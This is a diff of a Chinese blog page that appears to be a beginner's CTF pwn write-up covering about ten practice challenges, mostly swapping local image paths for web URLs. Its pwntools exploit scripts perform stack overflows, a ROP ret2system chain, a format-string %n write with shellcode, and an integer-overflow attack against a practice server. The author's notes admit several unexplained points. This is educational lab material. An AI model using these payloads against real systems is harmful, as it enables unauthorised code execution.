@@ -120,16 +120,16 @@
   <p> 初来咋到，多多包涵。</p>
 <h2 id="1、get-shell"><a href="#1、get-shell" class="headerlink" title="1、get shell"></a>1、get shell</h2><p>nc直连，cat flag。</p>
 <h2 id="2、hello-pwn"><a href="#2、hello-pwn" class="headerlink" title="2、hello_pwn"></a>2、hello_pwn</h2><p>扔进ida，f5一波</p>
-<p> <img src="C:\tool\blog\IY30\public\images\code\image-20210915225153004.png" alt="image-20210915225153004"></p>
+<p> <img src="https://iy30.github.io/images/code/image-20210915225153004.png" alt="image-20210915225153004"></p>
 <p>#alarm(时间)是闹钟函数，它可以在进程中设置一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%9A%E6%97%B6%E5%99%A8/22107516">定时器</a>，当定时器指定的时间到时，</p>
 <p>#它向<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BF%9B%E7%A8%8B/382503">进程</a>发送SIGALRM信号。</p>
 <p>#setbuf(文件流，缓冲区),将缓冲区与文件流相关联。</p>
 <p>#int read(int handle,void *buf,int len);读取打开文件的内容。</p>
 <p>#read（要读取的文件，文件内容所在缓冲区，读取的长度）</p>
 <p>查看sub_400686 </p>
-<p><img src="C:\tool\blog\IY30\public\images\code\image-20210915230254571.png" alt="image-20210915230254571"></p>
+<p><img src="https://iy30.github.io/images/code/image-20210915230254571.png" alt="image-20210915230254571"></p>
 <p>看到system中的内容，可以确定它就是shellcode。 </p>
-<p><img src="C:\tool\blog\IY30\public\images\code\image-20210915230428244.png" alt="image-20210915230428244"></p>
+<p><img src="https://iy30.github.io/images/code/image-20210915230428244.png" alt="image-20210915230428244"></p>
 <p>从内存中也可以可以看出，变量unk_601068地址为601068，</p>
 <p>变量dword_60106C地址为60106C，二则相差4个内存单元。</p>
 <p>故待会随便输入4个数。</p>
@@ -139,36 +139,36 @@
 
 
 <h2 id="3、level0"><a href="#3、level0" class="headerlink" title="3、level0"></a>3、level0</h2><p>扔进IDA看看，f5一波</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps41.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps41.jpg" alt="img"> </p>
 <p>没错就是你了，点开溢出函数看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps42.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps42.jpg" alt="img"> </p>
 <p>buf容量0x80，明显栈溢出</p>
 <p>点开左边栏的callsystem看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps43.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps43.jpg" alt="img"> </p>
 <p>确实有可用的shell</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps44.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps44.jpg" alt="img"> </p>
 <p><img src="C:\tool\blog\IY30\public\images\code\wps45.jpg" alt="img"> </p>
 <p>bin_sh=0x400596</p>
 <p>这里先计算一下，0x400596+0x（80+8）=0x40062e，确实等于_init_proc中断的地址</p>
 <p>Ps：我在后来才知道，上面这样说是错误的，只是巧合。二则没有因果关系。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps46.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps46.jpg" alt="img"> </p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">58020</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x400596</span>) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="4、level2—ROP"><a href="#4、level2—ROP" class="headerlink" title="4、level2—ROP"></a>4、level2—ROP</h2><p>先扔进IDA看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps47.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps47.jpg" alt="img"> </p>
 <p>点开vuln函数</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps48.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps48.jpg" alt="img"> </p>
 <p>发现buf溢出，溢出了16个内存单元</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps49.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps49.jpg" alt="img"> </p>
 <p>看一下_system函数</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps50.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps50.jpg" alt="img"> </p>
 <p>可以执行系统命令，shift +f12看看字符串</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps51.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps51.jpg" alt="img"> </p>
 <p>存在可用的shell</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps52.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps52.jpg" alt="img"> </p>
 <p>Exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">57341</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#s.process(./level2)</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x8048320</span></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(<span class="number">0x08048320</span>)  + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804a024</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#io.recvuntil(&#x27;:&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -176,31 +176,31 @@
 
 <p>总结：先栈溢出，使得返回地址变为system函数的地址，然后使其参数指向bin/sh，</p>
 <p>后者（使参数指向bin/sh）似乎也是一个溢出，覆盖某个地址。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\image-20210915230625662.png" alt="image-20210915230625662"></p>
+<p><img src="https://iy30.github.io/images/code/image-20210915230625662.png" alt="image-20210915230625662"></p>
 <p>前者栈溢出需要0x88+4+payload1，后者需要4+payload2，</p>
 <p>此处不解有一，后者为什么是4+pay，4从何而来？从上图中看出r在com的高处，</p>
 <p>而栈又从高处往低处生长，此处用类似溢出来覆盖参数来理解还是欠妥。</p>
 <h2 id="5、string"><a href="#5、string" class="headerlink" title="5、string"></a>5、string</h2><p>checksec如下</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps53.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps53.jpg" alt="img"> </p>
 <p>开了canary，ida看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps54.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps54.jpg" alt="img"> </p>
 <p>man函数显示是一个玩游戏的，走走看是一个故事游戏。</p>
 <p>进sub_400D72(v4);看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps55.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps55.jpg" alt="img"> </p>
 <p>输入一个小于等于12字节的姓名，然后是三个函数，进第一个看看，继续。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps56.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps56.jpg" alt="img"> </p>
 <p>按要求输入east前进。然后进了前面第二个函数。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps57.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps57.jpg" alt="img"> </p>
 <p>填1，然后输入一个地址一个愿望，注意此处的format，此处有格式化字符串漏洞，</p>
 <p>再看第三个函数。</p>
 <p>Ps：此处有三个isoc99scanf，按顺序写入到所定义的三个变量中，v1，format，v3.</p>
 <p>  故第二第三个isoc99scanf将数据写到format和v3中。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps58.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps58.jpg" alt="img"> </p>
 <p>要求*a1==a1[1]，也就是最开始的68和85相等（v3[0]==v3[1]），此处是重点，分析    时要注意传入参数是原来的哪个变量，不要给搞混了。</p>
 <p>再回刚刚第二个格式化字符串漏洞函数看看，此处wish填入若干个%d可以使得前面输</p>
 <p>入的address显示出来，显示在第七个，前面显示乱七八糟的也不知道是什么，此处源</p>
 <p>于百度，原理未知（格式化字符串漏洞）。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps59.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps59.jpg" alt="img"> </p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">\<span class="comment">#io = remote(&#x27;111.200.241.244&#x27;,53844)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#addr=str(int(r.recvuntil(&quot;\n&quot;)[:-1],16))</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#上面两条命令相等</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;name be:&quot;</span>, <span class="string">b&quot;woodwhale&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;east or up?:&quot;</span>, <span class="string">b&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;leave(0)?:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;address&#x27;&quot;</span>, <span class="built_in">str</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&quot;%9x,%9x,%9x,%9x,%9x,%35x%n&quot;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#io.sendlineafter(&quot;And, you wish is:&quot;, b&quot;a&quot;*85+b&quot;%7$n&quot;)</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#io.sendline(&quot;%85c%7$n&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, asm(shellcraft.amd64.sh(),arch=<span class="string">&quot;amd64&quot;</span>))</span><br><span class="line"></span><br><span class="line">\<span class="comment">#shell=asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;)，shellcode函数。</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -213,9 +213,9 @@
 <p>总结：出现多个isoc99scanf函数时，其输入的参数，依次传到所定义的顺序变量中。</p>
 <p>Int a，int b则第一个isoc99scanf参数传入a，第二个isoc99scanf参数传入b。</p>
 <h2 id="6、guess-num"><a href="#6、guess-num" class="headerlink" title="6、guess_num"></a>6、guess_num</h2><p>checksec一下</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps60.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps60.jpg" alt="img"> </p>
 <p>开了canary与pie，进Ida看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps61.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps61.jpg" alt="img"> </p>
 <p>main函数比较长，总结一下就是一个扔色子游戏，要连续十次猜对便得flag。</p>
 <p>那么来分析一下，色子掷出的随机数是用srand（seed[0]）函数，而它是一个伪随机数，    它的值由seed[0]的值决定。而从栈中可以看出，v9与seed相隔20个字节。</p>
 <p>故可以通过写入v9的同时覆盖seed的值，从而决定随机数的值。</p>
@@ -225,14 +225,14 @@
 
 
 <h2 id="7、int-flow"><a href="#7、int-flow" class="headerlink" title="7、int_flow"></a>7、int_flow</h2><p>先checksec一下</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps62.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps62.jpg" alt="img"> </p>
 <p>然后ida走一遍</p>
 <p>先看main函数</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps63.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps63.jpg" alt="img"> </p>
 <p>选1然后login</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps64.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps64.jpg" alt="img"> </p>
 <p>上面buf与s无溢出，继续走</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps65.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps65.jpg" alt="img"> </p>
 <p>到这可以看到，v3是一个未定义的整型，那么它的值在-255到+255之间，溢出后与256    取余。那么思路有了，开动。</p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">55729</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x804868e</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">234</span>  <span class="comment">#259-263之间</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>,<span class="string">b&#x27;nehs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input your passwd:&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#io.sendlineafter(&quot;Please input your passwd:&quot;,payload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -240,15 +240,15 @@
 
 
 <h2 id="8、cgpwn2（ret2text）"><a href="#8、cgpwn2（ret2text）" class="headerlink" title="8、cgpwn2（ret2text）"></a>8、cgpwn2（ret2text）</h2><p>Checksec</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps66.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps66.jpg" alt="img"> </p>
 <p>Ida</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps67.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps67.jpg" alt="img"> </p>
 <p>走你</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps68.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps68.jpg" alt="img"> </p>
 <p>仔细看一下，先是stdin输入一个name，然后在gets一个字符串</p>
 <p>这个字符串s的大小是0x26字节，这里是一个溢出点。</p>
 <p>再看到system函数</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps69.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps69.jpg" alt="img"> </p>
 <p>其参数不是我们要的，那么可以通过构造\bin\sh来覆盖返回地址，从而得到shell</p>
 <p>addr_system = 0x8048420</p>
 <p>addr_shell = 0x804a080</p>
@@ -264,11 +264,11 @@
 <p>文件，再用winhex查看后，对比之前的elf文件发现，它文件头混入了一些奇怪的东西，</p>
 <p>待我把前面的东西都删除之后（删到elf前面的一个空格），它就变成一个正常的elf</p>
 <p>文件了。下面切入正题。</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps70.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps70.jpg" alt="img"> </p>
 <p>Ida看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps71.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps71.jpg" alt="img"> </p>
 <p>进vlun函数看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps72.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps72.jpg" alt="img"> </p>
 <p>可以看到，buf有明显的栈溢出漏洞。</p>
 <p>但是，看了看代码中没有可利用的system函数和bin/sh，于是需要伪造一份。</p>
 <p>思路：利用ret2libc的思想，先构造第一个payload，使其栈溢出到write函数，然后得</p>
@@ -282,15 +282,15 @@
 
 <p>总结：构造payload1时，如上图红色所示，需添加p32（1）这个数据，通过实验测试，</p>
 <p>p32（2）也行，但是其他的便不行了，原因未知。上图黄色的p32（4）通过测试发现</p>
-<p>只有p32里大于等于4时才行，并且只有等于4时，最后不会出现\0x00，如下图所示。<img src="C:\tool\blog\IY30\public\images\code\image-20210915230921131.png" alt="image-20210915230921131"> </p>
+<p>只有p32里大于等于4时才行，并且只有等于4时，最后不会出现\0x00，如下图所示。<img src="https://iy30.github.io/images/code/image-20210915230921131.png" alt="image-20210915230921131"> </p>
 <p>原因未知。</p>
 <h2 id="10、cgfsb（格式化字符串）"><a href="#10、cgfsb（格式化字符串）" class="headerlink" title="10、cgfsb（格式化字符串）"></a>10、cgfsb（格式化字符串）</h2><p>Checksec</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps73.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps73.jpg" alt="img"> </p>
 <p>开了canary，ida看看</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps74.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps74.jpg" alt="img"> </p>
 <p>伪代码也很直接，先是输入一个名字，然后输入一段message，这里的printf函数可以</p>
 <p>做文章</p>
-<p><img src="C:\tool\blog\IY30\public\images\code\wps75.jpg" alt="img"> </p>
+<p><img src="https://iy30.github.io/images/code/wps75.jpg" alt="img"> </p>
 <p>可以看出aaaa对应的61616161在第十个（除了aaaa）</p>
 <p>利用格式化字符串的思想？：未理解。</p>
 <p>Exp：</p>
